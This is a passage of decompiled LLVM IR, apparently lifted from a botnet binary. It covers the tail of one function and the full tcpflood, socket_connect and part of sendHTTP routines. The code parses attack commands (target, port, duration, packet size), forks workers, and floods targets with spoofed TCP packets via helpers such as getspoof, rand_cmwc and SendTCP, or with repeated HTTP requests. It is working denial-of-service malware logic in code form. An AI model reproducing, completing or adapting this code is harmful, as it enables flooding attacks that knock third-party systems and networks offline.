  %sext38 = mul i32 %v3_80504bd, 65536
  %v1_80504c5 = sdiv i32 %sext38, 65536
  store i32 %v1_80504c5, i32* %edx.global-to-local, align 4
  store i32 %v2_804ff85, i32* %eax.global-to-local, align 4
  store i16 %v4_80504bd, i16* %v4_8050415, align 2
  store i32 %v3_804fe7e, i32* @edi, align 4
  %v10_80504d1 = icmp ult i32 %stack_var_-100.0, %v3_804fe7e
  store i1 %v10_80504d1, i1* %cf.global-to-local, align 1
  %v15_80504d1 = icmp eq i32 %stack_var_-100.0, %v3_804fe7e
  %v1_80504d4 = icmp eq i1 %v15_80504d1, false
  br i1 %v1_80504d4, label %dec_label_pc_80504f4, label %dec_label_pc_80504d6

dec_label_pc_80504d6:                             ; preds = %dec_label_pc_8050435
  %v0_80504d6 = load i32, i32* @esp, align 4
  %v5_80504d6 = icmp ult i32 %v0_80504d6, 12
  store i1 %v5_80504d6, i1* %cf.global-to-local, align 1
  %v1_80504d9 = add i32 %v0_80504d6, -16
  %v2_80504d9 = inttoptr i32 %v1_80504d9 to i32*
  store i32 0, i32* %v2_80504d9, align 4
  %v1_80504db = inttoptr i32 %stack_var_-100.0 to i32*
  %v2_80504db = call i32 @__GI_time(i32* %v1_80504db)
  store i32 %v2_80504db, i32* %eax.global-to-local, align 4
  %v0_80504e0 = load i32, i32* @esp, align 4
  %v1_80504e0 = add i32 %v0_80504e0, 16
  %v10_80504e3 = icmp ult i32 %v2_80504db, %v5_8050426
  store i1 %v10_80504e3, i1* %cf.global-to-local, align 1
  %v8_80504e6 = icmp sgt i32 %v2_80504db, %v5_8050426
  br i1 %v8_80504e6, label %dec_label_pc_80504fc, label %dec_label_pc_8050435

dec_label_pc_80504f4:                             ; preds = %dec_label_pc_8050435
  %v4_80504f4 = add i32 %stack_var_-100.0, 1
  %v0_805043b.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050435

dec_label_pc_80504fc:                             ; preds = %dec_label_pc_80504d6, %dec_label_pc_804ff15, %dec_label_pc_804fee0, %dec_label_pc_804fec2, %entry
  %v0_8050506 = phi i32 [ %v5_804ff2c, %dec_label_pc_804ff15 ], [ %v3_804feff, %dec_label_pc_804fee0 ], [ %v3_804fecf, %dec_label_pc_804fec2 ], [ %v1_804fe3b, %entry ], [ %v2_80504db, %dec_label_pc_80504d6 ]
  %v2_8050502 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050502, i32* @ebx, align 4
  store i32 %v0_804fe2e, i32* @esi, align 4
  store i32 %v0_804fe2d, i32* @edi, align 4
  ret i32 %v0_8050506

; uselistorder directives
  uselistorder i32 %v2_80504db, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050464, { 1, 0 }
  uselistorder i32 %stack_var_-100.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_805043b, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_8050426, { 1, 0, 2, 3 }
  uselistorder i32 %v3_805041e, { 1, 0 }
  uselistorder i32 %v1_80503e3, { 1, 0 }
  uselistorder i32 %v1_80503bb, { 1, 0 }
  uselistorder i32 %v3_8050377, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_-224.0, { 1, 0 }
  uselistorder i32 %stack_var_-228.0, { 1, 0 }
  uselistorder i32 %v1_8050367, { 1, 0 }
  uselistorder i1 %v0_805034e, { 1, 0 }
  uselistorder i32 %v6_805034c, { 1, 0 }
  uselistorder i32 %v1_8050314, { 1, 0 }
  uselistorder i1 %v0_80502fb, { 1, 0 }
  uselistorder i32 %v6_80502f9, { 1, 0 }
  uselistorder i32 %v1_80502be, { 1, 0 }
  uselistorder i1 %v0_80502a5, { 1, 0 }
  uselistorder i32 %v6_80502a3, { 1, 0 }
  uselistorder i32 %v1_8050268, { 1, 0 }
  uselistorder i1 %v0_805024f, { 1, 0 }
  uselistorder i32 %v6_805024d, { 1, 0 }
  uselistorder i32 %v1_8050212, { 1, 0 }
  uselistorder i1 %v0_80501f9, { 1, 0 }
  uselistorder i32 %v6_80501f7, { 1, 0 }
  uselistorder i32 %v1_80501bc, { 1, 0 }
  uselistorder i1 %v0_80501a3, { 1, 0 }
  uselistorder i32 %v6_80501a1, { 1, 0 }
  uselistorder i32 %v4_8050171, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %stack_var_-228.149, { 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-224.150, { 4, 3, 2, 1, 0 }
  uselistorder i8* %v3_805031c, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_8050364, { 5, 11, 4, 10, 3, 9, 2, 8, 1, 7, 0, 6 }
  uselistorder i32 %v1_805014a, { 1, 0 }
  uselistorder i32 %v1_805013e, { 1, 0 }
  uselistorder i8* %v2_805013b, { 1, 2, 0, 3 }
  uselistorder i1 %v0_8050125, { 1, 0 }
  uselistorder i32 %v6_8050123, { 1, 0 }
  uselistorder i32 %v1_80500e8, { 1, 0 }
  uselistorder i32 %v1_80500dc, { 1, 0 }
  uselistorder i32 %v1_80500d0, { 1, 0 }
  uselistorder i8* %v2_80500cd, { 2, 3, 1, 4, 0, 5 }
  uselistorder i1 %v0_80500b7, { 1, 0 }
  uselistorder i32 %v1_805007a, { 1, 0 }
  uselistorder i32 %v1_805006e, { 1, 0 }
  uselistorder i32 %v1_8050062, { 1, 0 }
  uselistorder i32 %v1_8050056, { 1, 0 }
  uselistorder i32 %v1_805004a, { 1, 0 }
  uselistorder i32 %v1_805003e, { 1, 0 }
  uselistorder i8* %v2_805003b, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 0, 11 }
  uselistorder i1 %v0_8050025, { 1, 0 }
  uselistorder i32 %v1_804ffd7, { 1, 0 }
  uselistorder i32 %v0_804ffb9, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_804ff9d, { 11, 12, 13, 14, 15, 16, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %v2_804ff85, { 13, 12, 11, 10, 9, 8, 7, 25, 24, 23, 6, 5, 22, 4, 3, 21, 20, 19, 18, 28, 27, 26, 17, 16, 15, 14, 2, 1, 0 }
  uselistorder i32 %v2_804ff5b, { 1, 0 }
  uselistorder i32 %v3_804feff, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_804fead, { 1, 0 }
  uselistorder i32 %v3_804fe87, { 1, 0, 2 }
  uselistorder i32 %v3_804fe7e, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_804fe75, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804fe6c, { 0, 2, 1, 4, 3, 7, 6, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-92, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-84, { 1, 0, 2 }
  uselistorder i32* %stack_var_-96, { 2, 1, 0, 4, 3 }
  uselistorder i32 %tmp111, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 13, 12, 11, 10 }
  uselistorder i8** %stack_var_-20, { 2, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 27, 28, 29, 31, 38, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 86 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 32, 13, 14, 15, 17, 16, 18, 20, 19, 21, 23, 22, 24, 26, 25, 27, 29, 28, 30, 31, 0, 33, 34, 35, 36, 40, 37, 38, 39, 41, 48, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @getspoof, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050435, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503d0, { 1, 0 }
  uselistorder label %dec_label_pc_805036d, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050171, { 1, 0 }
  uselistorder label %dec_label_pc_804ff62, { 1, 0 }
  uselistorder label %bb131, { 1, 0 }
  uselistorder label %dec_label_pc_804fec2, { 1, 0 }
}

define i32 @tcpflood(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-92 = alloca i32, align 4
  %v0_805050a = load i32, i32* @ebx, align 4
  %v15_805050b = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v15_805050b, i32* @eax, align 4
  %v1_8050519 = call i32 @mfork(i32 %arg2)
  %v1_8050521 = icmp eq i32 %v1_8050519, 0
  %v1_8050523 = icmp eq i1 %v1_8050521, false
  br i1 %v1_8050523, label %dec_label_pc_8050837, label %dec_label_pc_8050529

dec_label_pc_8050529:                             ; preds = %entry
  %v7_805052d = icmp sgt i32 %arg3, 6
  br i1 %v7_805052d, label %dec_label_pc_805052f, label %dec_label_pc_805059d

dec_label_pc_805052f:                             ; preds = %dec_label_pc_8050529
  %v1_8050532 = add i32 %arg4, 12
  %v1_8050535 = inttoptr i32 %v1_8050532 to i32*
  %v2_8050535 = load i32, i32* %v1_8050535, align 4
  %v1_805053b = call i32 @atol(i32 %v2_8050535)
  %v10_8050543 = icmp eq i32 %v1_805053b, -1
  br i1 %v10_8050543, label %dec_label_pc_805059d, label %dec_label_pc_8050548

dec_label_pc_8050548:                             ; preds = %dec_label_pc_805052f
  %v1_805054b = add i32 %arg4, 8
  %v1_805054e = inttoptr i32 %v1_805054b to i32*
  %v2_805054e = load i32, i32* %v1_805054e, align 4
  %v1_8050554 = call i32 @atol(i32 %v2_805054e)
  %v10_805055c = icmp eq i32 %v1_8050554, -1
  br i1 %v10_805055c, label %dec_label_pc_805059d, label %dec_label_pc_8050567

dec_label_pc_8050567:                             ; preds = %dec_label_pc_8050548
  %v1_805056a = add i32 %arg4, 20
  %v1_805056d = inttoptr i32 %v1_805056a to i32*
  %v2_805056d = load i32, i32* %v1_805056d, align 4
  %v1_8050573 = call i32 @atol(i32 %v2_805056d)
  %v2_805057b = icmp slt i32 %v1_8050573, 0
  br i1 %v2_805057b, label %dec_label_pc_805059d, label %dec_label_pc_805057f

dec_label_pc_805057f:                             ; preds = %dec_label_pc_8050567
  %v12_805057f = icmp eq i32 %arg3, 7
  %v1_8050583 = icmp eq i1 %v12_805057f, false
  br i1 %v1_8050583, label %dec_label_pc_8050622, label %dec_label_pc_8050585

dec_label_pc_8050585:                             ; preds = %dec_label_pc_805057f
  %v1_8050588 = add i32 %arg4, 24
  %v1_805058b = inttoptr i32 %v1_8050588 to i32*
  %v2_805058b = load i32, i32* %v1_805058b, align 4
  %v1_8050591 = call i32 @atol(i32 %v2_805058b)
  %tmp37 = icmp slt i32 %v1_8050591, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8050622, label %dec_label_pc_805059d

dec_label_pc_805059d:                             ; preds = %dec_label_pc_8050529, %dec_label_pc_8050585, %dec_label_pc_8050567, %dec_label_pc_8050548, %dec_label_pc_805052f
  %v3_80505ab = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_806a1a8.292 to i32))
  br label %dec_label_pc_8050837

dec_label_pc_8050622:                             ; preds = %dec_label_pc_8050585, %dec_label_pc_805057f
  %v1_80505bb = add i32 %arg4, 4
  %v1_80505be = inttoptr i32 %v1_80505bb to i32*
  %v2_80505be = load i32, i32* %v1_80505be, align 4
  %v2_80505c9 = load i32, i32* %v1_805054e, align 4
  %v1_80505cf = call i32 @atol(i32 %v2_80505c9)
  %v2_80505e0 = load i32, i32* %v1_8050535, align 4
  %v1_80505e6 = call i32 @atol(i32 %v2_80505e0)
  %v1_80505f4 = add i32 %arg4, 16
  %v1_80505f7 = inttoptr i32 %v1_80505f4 to i32*
  %v2_80505f7 = load i32, i32* %v1_80505f7, align 4
  %v2_8050608 = load i32, i32* %v1_805056d, align 4
  %v1_805060e = call i32 @atol(i32 %v2_8050608)
  br i1 %v1_8050583, label %dec_label_pc_805064e, label %dec_label_pc_805062e

dec_label_pc_805062e:                             ; preds = %dec_label_pc_8050622
  %v1_8050631 = add i32 %arg4, 24
  %v1_8050634 = inttoptr i32 %v1_8050631 to i32*
  %v2_8050634 = load i32, i32* %v1_8050634, align 4
  %v1_805063a = call i32 @atol(i32 %v2_8050634)
  br label %dec_label_pc_805064e

dec_label_pc_805064e:                             ; preds = %dec_label_pc_8050622, %dec_label_pc_805062e
  %storemerge2 = phi i32 [ %v1_805063a, %dec_label_pc_805062e ], [ 10, %dec_label_pc_8050622 ]
  %v1_8050657 = add i32 %arg4, 28
  %v1_805065a = inttoptr i32 %v1_8050657 to i32*
  %v2_805065a = load i32, i32* %v1_805065a, align 4
  %v1_8050660 = call i32 @atol(i32 %v2_805065a)
  %v2_805067e = load i32, i32* %v1_80505be, align 4
  %v1_8050684 = call i32 @inet_addr(i32 %v2_805067e)
  %v2_80506a0 = mul i32 %v1_8050660, 28
  %v1_80506a5 = add i32 %v2_80506a0, 30
  %v2_80506a8 = and i32 %v1_80506a5, -16
  %v2_80506ae = sub i32 %v15_805050b, %v2_80506a8
  %v1_80506b6 = add i32 %v2_80506ae, 15
  %v2_80506b9 = and i32 %v1_80506b6, -16
  store i32 %v2_80505be, i32* @eax, align 4
  %v1_80506ce = add i32 %v2_80506ae, -12
  %v2_80506ce = inttoptr i32 %v1_80506ce to i32*
  store i32 ptrtoint (i32* @global_var_80699fe.198 to i32), i32* %v2_80506ce, align 4
  %v0_80506d3 = load i32, i32* @eax, align 4
  %v2_80506d3 = add i32 %v2_80506ae, -16
  %v3_80506d3 = inttoptr i32 %v2_80506d3 to i32*
  store i32 %v0_80506d3, i32* %v3_80506d3, align 4
  %v2_80506d4 = call i32 @__GI_strtok(i32 %v2_80506b9, i32 %v15_805050b)
  %v1_80507f2 = add i32 %v1_8050660, -1
  %v8_80507f640 = icmp sgt i32 %v1_80507f2, 0
  br i1 %v8_80507f640, label %dec_label_pc_80506eb, label %dec_label_pc_80507fc

dec_label_pc_80506eb:                             ; preds = %dec_label_pc_805064e, %dec_label_pc_80506eb
  %storemerge41 = phi i32 [ %v4_80507ec, %dec_label_pc_80506eb ], [ 0, %dec_label_pc_805064e ]
  store i32 %storemerge41, i32* @ebx, align 4
  %v2_8050702 = mul i32 %storemerge41, 28
  %v3_8050704 = add i32 %v2_8050702, %v2_80506b9
  %v4_8050704 = inttoptr i32 %v3_8050704 to i32*
  store i32 %storemerge41, i32* %v4_8050704, align 4
  %v1_805071f = add i32 %v3_8050704, 4
  %v2_8050725 = inttoptr i32 %v1_805071f to i32*
  store i32 %v1_80505cf, i32* %v2_8050725, align 4
  %v1_805073f = add i32 %v3_8050704, 8
  %v2_8050745 = inttoptr i32 %v1_805073f to i32*
  store i32 %v1_80505e6, i32* %v2_8050745, align 4
  %v1_805075f = add i32 %v3_8050704, 12
  %v2_8050765 = inttoptr i32 %v1_805075f to i32*
  store i32 %v2_80505f7, i32* %v2_8050765, align 4
  %v1_805077f = add i32 %v3_8050704, 16
  %v2_8050785 = inttoptr i32 %v1_805077f to i32*
  store i32 %v1_805060e, i32* %v2_8050785, align 4
  %v1_805079f = add i32 %v3_8050704, 20
  %v2_80507a5 = inttoptr i32 %v1_805079f to i32*
  store i32 %storemerge2, i32* %v2_80507a5, align 4
  %v1_80507bf = add i32 %v3_8050704, 24
  %v2_80507c5 = inttoptr i32 %v1_80507bf to i32*
  store i32 32, i32* %v2_80507c5, align 4
  store i32 %v2_80506b9, i32* @ecx, align 4
  %v0_80507e0 = load i32, i32* @esp, align 4
  %v2_80507e3 = add i32 %v0_80507e0, -16
  %v3_80507e3 = inttoptr i32 %v2_80507e3 to i32*
  store i32 %v3_8050704, i32* %v3_80507e3, align 4
  %v0_80507e4 = call i32 @SendTCP()
  %v4_80507ec = add nuw nsw i32 %storemerge41, 1
  %exitcond = icmp eq i32 %v1_80507f2, %v4_80507ec
  br i1 %exitcond, label %dec_label_pc_80507fc, label %dec_label_pc_80506eb

dec_label_pc_80507fc:                             ; preds = %dec_label_pc_80506eb, %dec_label_pc_805064e
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_805064e ], [ %v1_80507f2, %dec_label_pc_80506eb ]
  %v0_80507fc.lcssa.in = load i32, i32* @esp, align 4
  %v5_80507ff = add i32 %v0_80507fc.lcssa.in, 8
  %v6_80507ff = inttoptr i32 %v5_80507ff to i32*
  store i32 %v1_8050660, i32* %v6_80507ff, align 4
  %v5_8050802 = add i32 %v0_80507fc.lcssa.in, 4
  %v6_8050802 = inttoptr i32 %v5_8050802 to i32*
  store i32 %v2_80505f7, i32* %v6_8050802, align 4
  %v6_8050805 = inttoptr i32 %v0_80507fc.lcssa.in to i32*
  store i32 %v1_80505cf, i32* %v6_8050805, align 4
  %v5_8050808 = add i32 %v0_80507fc.lcssa.in, -4
  %v6_8050808 = inttoptr i32 %v5_8050808 to i32*
  store i32 %v2_80506d4, i32* %v6_8050808, align 4
  %v5_805080b = add i32 %v0_80507fc.lcssa.in, -8
  %v6_805080b = inttoptr i32 %v5_805080b to i32*
  store i32 %arg2, i32* %v6_805080b, align 4
  %v1_805080e = add i32 %v0_80507fc.lcssa.in, -12
  %v2_805080e = inttoptr i32 %v1_805080e to i32*
  store i32 ptrtoint ([54 x i8]* @global_var_806a204.293 to i32), i32* %v2_805080e, align 4
  %v5_8050813 = add i32 %v0_80507fc.lcssa.in, -16
  %v6_8050813 = inttoptr i32 %v5_8050813 to i32*
  store i32 %arg1, i32* %v6_8050813, align 4
  %v2_8050816 = call i32 @Send(i32 %storemerge.lcssa, i32 %v0_805050a)
  %v0_805081b = load i32, i32* @esp, align 4
  %v2_8050824 = add i32 %v0_805081b, 16
  %v3_8050824 = inttoptr i32 %v2_8050824 to i32*
  store i32 %v1_80505e6, i32* %v3_8050824, align 4
  %v1_8050825 = call i32 @sleep(i32 %storemerge.lcssa)
  %v0_805082a = load i32, i32* @esp, align 4
  %v2_8050830 = inttoptr i32 %v0_805082a to i32*
  store i32 0, i32* %v2_8050830, align 4
  %v1_8050832 = call i32 @__GI_exit(i32 %storemerge.lcssa)
  br label %dec_label_pc_8050837

dec_label_pc_8050837:                             ; preds = %entry, %dec_label_pc_805059d, %dec_label_pc_80507fc
  %v0_805083e = phi i32 [ %v1_8050519, %entry ], [ %v3_80505ab, %dec_label_pc_805059d ], [ %v1_8050832, %dec_label_pc_80507fc ]
  ret i32 %v0_805083e

; uselistorder directives
  uselistorder i32 %v0_80507fc.lcssa.in, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge.lcssa, { 2, 1, 0 }
  uselistorder i32 %v4_80507ec, { 1, 0 }
  uselistorder i32 %storemerge41, { 2, 3, 0, 1 }
  uselistorder i32 %v2_80506b9, { 2, 0, 1 }
  uselistorder i32 %v2_80506ae, { 1, 0, 2 }
  uselistorder i32 %v15_805050b, { 1, 0, 2 }
  uselistorder i32 %arg4, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050837, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80506eb, { 1, 0 }
  uselistorder label %dec_label_pc_805064e, { 1, 0 }
  uselistorder label %dec_label_pc_805059d, { 1, 2, 3, 4, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_8050859 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_8050864 = icmp eq i32 %v1_8050859, 0
  %v1_8050868 = icmp eq i1 %v4_8050864, false
  br i1 %v1_8050868, label %dec_label_pc_8050876, label %dec_label_pc_805086a

dec_label_pc_805086a:                             ; preds = %entry
  br label %dec_label_pc_805091b

dec_label_pc_8050876:                             ; preds = %entry
  %v1_8050879 = add i32 %v1_8050859, 12
  %v2_8050879 = inttoptr i32 %v1_8050879 to i32*
  %v3_8050879 = load i32, i32* %v2_8050879, align 4
  %v1_8050881 = add i32 %v1_8050859, 16
  %v2_8050881 = inttoptr i32 %v1_8050881 to i32*
  %v3_8050881 = load i32, i32* %v2_8050881, align 4
  %v1_8050884 = inttoptr i32 %v3_8050881 to i32*
  %v2_8050884 = load i32, i32* %v1_8050884, align 4
  %v15_805088d = ptrtoint i32* %stack_var_-24 to i32
  %v3_8050892 = call i32 @bcopy(i32 %v2_8050884, i32 %v15_805088d, i32 %v3_8050879)
  %v1_805089d1 = zext i16 %arg2 to i32
  %v1_80508a6 = call i32 @htons(i32 %v1_805089d1)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_80508c1 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_80508cc = ptrtoint i32* %stack_var_-32 to i32
  %v5_80508dc = call i32 @__GI_setsockopt(i32 %v3_80508c1, i32 6, i32 1, i32 %v2_80508cc, i32 4)
  %v13_80508e4 = icmp eq i32 %v3_80508c1, -1
  %v1_80508e8 = icmp eq i1 %v13_80508e4, false
  br i1 %v1_80508e8, label %dec_label_pc_80508f3, label %dec_label_pc_80508ea

dec_label_pc_80508ea:                             ; preds = %dec_label_pc_8050876
  br label %dec_label_pc_805091b

dec_label_pc_80508f3:                             ; preds = %dec_label_pc_8050876
  %v2_805088a = ptrtoint i32* %stack_var_-28 to i32
  %v3_80508ff = call i32 @connect(i32 %v3_80508c1, i32 %v2_805088a, i32 16)
  %v10_8050907 = icmp eq i32 %v3_80508ff, -1
  %v1_805090a = icmp eq i1 %v10_8050907, false
  br i1 %v1_805090a, label %dec_label_pc_8050915, label %dec_label_pc_805090c

dec_label_pc_805090c:                             ; preds = %dec_label_pc_80508f3
  br label %dec_label_pc_805091b

dec_label_pc_8050915:                             ; preds = %dec_label_pc_80508f3
  br label %dec_label_pc_805091b

dec_label_pc_805091b:                             ; preds = %dec_label_pc_805090c, %dec_label_pc_80508ea, %dec_label_pc_805086a, %dec_label_pc_8050915
  %v3_805091b = phi i32 [ 0, %dec_label_pc_805090c ], [ 0, %dec_label_pc_80508ea ], [ 0, %dec_label_pc_805086a ], [ %v3_80508c1, %dec_label_pc_8050915 ]
  ret i32 %v3_805091b

; uselistorder directives
  uselistorder i32 %v3_80508c1, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_805091b, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp27 = inttoptr i32 %arg4 to i8*
  %stack_var_8 = alloca i8*, align 4
  store i8* %arg2, i8** %stack_var_8, align 4
  %stack_var_-1072 = alloca i32, align 4
  %v0_8050924 = load i32, i32* @ebx, align 4
  %v2_8050945 = call i32 @__GI_time(i32* null)
  %v5_805094d = add i32 %v2_8050945, %arg5
  %v1_8050953 = call i32 @random()
  store i32 %v1_8050953, i32* @ecx, align 4
  %v2_8050963 = udiv i32 %v1_8050953, 49
  store i32 %v2_8050963, i32* @ebx, align 4
  %tmp = mul i32 %v2_8050963, -17
  %v2_8050985 = add i32 %v1_8050953, %tmp
  store i32 %v2_8050985, i32* @edi, align 4
  %v1_8050993 = mul i32 %v2_8050985, 4
  %v2_8050993 = add i32 %v1_8050993, 134675104
  %v3_8050993 = inttoptr i32 %v2_8050993 to i32*
  %v4_8050993 = load i32, i32* %v3_8050993, align 4
  %v2_805099d = call i32 @random()
  %v2_80509ad = ashr i32 %v2_805099d, 31
  %v2_80509b0 = zext i32 %v2_805099d to i64
  %v4_80509b0 = zext i32 %v2_80509ad to i64
  %v5_80509b0 = mul nuw i64 %v4_80509b0, 4294967296
  %v6_80509b0 = or i64 %v5_80509b0, %v2_80509b0
  %v10_80509b0 = srem i64 %v6_80509b0, 3
  %v11_80509b0 = trunc i64 %v10_80509b0 to i32
  %v0_80509b4 = load i32, i32* @ebp, align 4
  %v2_80509b4 = mul i32 %v11_80509b0, 4
  %v3_80509b4 = add i32 %v0_80509b4, -44
  %v4_80509b4 = add i32 %v3_80509b4, %v2_80509b4
  %v5_80509b4 = inttoptr i32 %v4_80509b4 to i32*
  %v6_80509b4 = load i32, i32* %v5_80509b4, align 4
  %v3_80509bb = load i8*, i8** %stack_var_8, align 4
  %v3_80509d2 = call i32 @_strlen(i8* %v3_80509bb)
  %v3_80509f2 = call i32 @_strlen(i8* %tmp27)
  %v2_80509f9 = add i32 %v3_80509d2, %v3_80509f2
  %v4_8050a0c = inttoptr i32 %v4_8050993 to i8*
  %v3_8050a12 = call i32 @_strlen(i8* %v4_8050a0c)
  %v2_8050a19 = add i32 %v2_80509f9, %v3_8050a12
  store i1 false, i1* @df, align 1
  %v4_8050a2c = inttoptr i32 %v6_80509b4 to i8*
  store i32 %v6_80509b4, i32* @edi, align 4
  %v3_8050a32 = call i32 @_strlen(i8* %v4_8050a2c)
  %v2_8050a1962 = add i32 %v2_8050a19, %v3_8050a32
  %v1_8050a3c = add i32 %v2_8050a1962, 55
  %v4_8050a42 = add i32 %v2_8050a1962, -968
  %v9_8050a42 = sub i32 967, %v2_8050a1962
  %v10_8050a42 = and i32 %v9_8050a42, %v1_8050a3c
  %v11_8050a42 = icmp slt i32 %v10_8050a42, 0
  %v12_8050a42 = icmp eq i32 %v4_8050a42, 0
  %v13_8050a42 = icmp slt i32 %v4_8050a42, 0
  %v3_8050a49 = icmp eq i1 %v13_8050a42, %v11_8050a42
  %v4_8050a49 = icmp eq i1 %v12_8050a42, false
  %v5_8050a49 = and i1 %v4_8050a49, %v3_8050a49
  br i1 %v5_8050a49, label %dec_label_pc_8050b22, label %dec_label_pc_8050a4f

dec_label_pc_8050a4f:                             ; preds = %entry
  %v4_80509bb = ptrtoint i8* %v3_80509bb to i32
  %v2_8050a67 = ptrtoint i32* %stack_var_-1072 to i32
  %v9_8050a6e = call i32 @__GI_snprintf(i32 %v2_8050a67, i32 %v1_8050a3c, i32 ptrtoint ([64 x i8]* @global_var_806a254.297 to i32), i32 %v4_80509bb, i32 %arg4, i32 %v4_8050993, i32 %v6_80509b4)
  %v5_8050b1c60 = icmp sgt i32 %arg6, 0
  br i1 %v5_8050b1c60, label %dec_label_pc_8050a82, label %dec_label_pc_8050b22

dec_label_pc_8050a82:                             ; preds = %dec_label_pc_8050a4f, %dec_label_pc_8050b13
  %storemerge61 = phi i32 [ %v4_8050b13, %dec_label_pc_8050b13 ], [ 0, %dec_label_pc_8050a4f ]
  %v1_8050a82 = call i32 @fork(i32 %storemerge61)
  %v1_8050a87 = icmp eq i32 %v1_8050a82, 0
  br i1 %v1_8050a87, label %dec_label_pc_8050b13, label %dec_label_pc_8050af7.preheader

dec_label_pc_8050af7.preheader:                   ; preds = %dec_label_pc_8050a82
  %v4_8050ac6 = bitcast i32* %stack_var_-1072 to i8*
  %v2_8050aa1 = trunc i32 %arg3 to i16
  br label %dec_label_pc_8050af7

dec_label_pc_8050a91:                             ; preds = %dec_label_pc_8050af7
  store i32 %arg1, i32* @edx, align 4
  %v3_8050aa1 = call i32 @socket_connect(i32 %arg1, i16 %v2_8050aa1)
  %v4_8050aac = icmp eq i32 %v3_8050aa1, 0
  br i1 %v4_8050aac, label %dec_label_pc_8050af7, label %dec_label_pc_8050ab2

dec_label_pc_8050ab2:                             ; preds = %dec_label_pc_8050a91
  store i1 false, i1* @df, align 1
  store i32 %v2_8050a67, i32* @edi, align 4
  %v3_8050acc = call i32 @_strlen(i8* %v4_8050ac6)
  %v4_8050acc = mul i32 %v3_8050acc, -1
  %v5_8050acc = add i32 %v4_8050acc, -2
  store i32 %v5_8050acc, i32* @ecx, align 4
  %v1_8050ad2 = sub i32 0, %v4_8050acc
  %v3_8050ae1 = call i32 @write(i32 %v3_8050aa1, i32 %v2_8050a67, i32 %v1_8050ad2)
  %v1_8050aef = call i32 @close(i32 %v3_8050aa1)
  br label %dec_label_pc_8050af7

dec_label_pc_8050af7:                             ; preds = %dec_label_pc_8050a91, %dec_label_pc_8050ab2, %dec_label_pc_8050af7.preheader
